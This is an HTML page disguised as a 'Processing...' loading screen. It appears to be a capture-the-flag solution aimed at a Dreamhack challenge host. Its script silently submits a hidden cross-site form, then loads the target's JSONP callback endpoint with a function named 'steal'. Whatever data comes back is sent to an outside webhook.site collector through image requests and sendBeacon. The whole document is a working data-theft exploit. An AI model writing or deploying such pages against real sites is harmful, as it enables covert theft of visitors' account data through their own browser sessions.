<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Loading...</title>
</head>
<body>
<h1>Processing...</h1>
<script>
(function() {
  var webhook = 'https://webhook.site/c9d4a3d0-88aa-45d5-8c8a-6c317e3f2bd1';
  
  // Step 1: Form 생성 및 제출
  var form = document.createElement('form');
  form.method = 'POST';
  form.action = 'http://host8.dreamhack.games:9182/post';
  form.target = 'iframe1';
  form.style.display = 'none';
  
  var input = document.createElement('input');
  input.name = 'info_value';
  input.value = 'TEST_VALUE';
  form.appendChild(input);
  
  var iframe = document.createElement('iframe');
  iframe.name = 'iframe1';
  iframe.style.display = 'none';
  
  document.body.appendChild(iframe);
  document.body.appendChild(form);
  
  console.log('[1] Submitting form');
  form.submit();
  
  // Step 2: Callback 호출
  setTimeout(function() {
    console.log('[2] Loading callback');
    
    window.steal = function(data) {
      console.log('[3] Got data:', data);
      var info = JSON.stringify(data);
      
      // 전송
      new Image().src = webhook + '?data=' + encodeURIComponent(info);
      
      if (navigator.sendBeacon) {
        navigator.sendBeacon(webhook + '?beacon=' + encodeURIComponent(info));
      }
    };
    
    var s = document.createElement('script');
    s.src = 'http://host8.dreamhack.games:9182/callback?callback=window.steal';
    s.onerror = function() {
      new Image().src = webhook + '?error=callback_failed';
    };
    document.body.appendChild(s);
    
  }, 2000);
  
})();
</script>
</body>
</html>
